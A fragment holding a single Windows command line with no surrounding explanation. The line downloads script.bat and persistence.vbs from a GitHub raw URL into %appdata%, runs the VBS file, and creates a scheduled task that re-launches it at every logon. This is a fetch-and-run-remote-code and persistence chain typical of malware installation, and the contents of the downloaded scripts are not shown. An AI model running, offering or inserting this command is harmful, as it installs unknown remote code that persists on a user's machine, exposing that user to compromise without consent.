...
cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/script.bat -O && curl https://raw.githubusercontent.com/ishanarya24/dc/main/persistence.vbs -O && start persistence.vbs && cmd /c SCHTASKS /CREATE /SC ONLOGON /TN "testTask12" /TR %appdata%\persistence.vbs
